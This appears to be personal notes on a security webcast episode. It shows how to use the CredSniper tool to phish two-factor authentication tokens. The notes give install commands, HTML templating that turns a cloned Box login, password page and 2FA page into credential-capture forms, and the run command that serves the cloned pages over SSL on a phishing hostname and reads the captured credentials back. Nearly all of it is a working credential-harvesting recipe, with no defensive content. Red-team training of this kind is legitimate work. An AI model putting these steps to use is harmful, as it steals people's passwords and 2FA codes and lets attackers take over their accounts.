Phishing 2FA Tokens with CredSniper - Tradecraft Security Weekly - #25

https://github.com/ustayready/CredSniper
# Overview
- More orgs are implementing 2FA
- Need a method to capture 2FA tokens
- Need rapid method to clone auth portals
- CredSniper to save the day.

# Install
```
# git clone https://github.com/ustayready/CredSniper
# cd CredSniper
# ./install.sh
gmail
https://box.com/
Y
Y
tsw.poppingboxes.org (the hostname for certs and our phishing domain)
port 443
```
will start building.
Go to login portal that we want to clone.
Copy the html
save to text file
add templating to direct to "{{ next_url }} " on index.html page
```
<div class="main-body is-narrow">  <form id="login-form" name="login-form" method="POST" action="{{ next_url }}"><div class="login-container"><h1>Sign In to Your Account</h1> etc.....
```
![b068b6bab3d35d6c43a753f609142e38.png](../_resources/b4b97dbde4b0456094c2e1238c499904.png)

add templating for username on password.html page
```
<span class="login-preview">Signing in as {{ username }}.</span>
<a href="/login?redirect_url=%2F" title=....etc
<input type="text" name="username" value="{{ username }}" id="username" class="hidden" autocomplete="username">
```
![dda7ea052fe83efe6e4db53123bcb183.png](../_resources/c9f5fbc9831d43a98ed6a6787dc67ea3.png)

add templating to twofa.html
```
<div class="login-container"><form method blah blah {{ next_url }} "><h1 class="login-heading">Using a new device?etc....

<input type="hidden" id="password" name="password" value="{{ password }}">
<input type="hidden" id="username" value="{{ username }}">
```
![c76cc125cfce198146f4937f7583935e.png](../_resources/9ab08fbef00e44019b9db7eb7643c5c3.png)
creds captured in .cache file

Box DEMO
```
# mkdir box
# cd box
# cp -R ../example/*
# ls -la
# mv example.py box.py
# ls -la templates/
# ....create login.html password.html twofactor.html
# cd ..
# cd ..
# source bin/activate
# python3 credsniper.py
# python3 credsniper.py --module box --two-factor --port 443 --ssl --final https://box.com --hostname tsw.poppingboxes.org
# cat .sniped


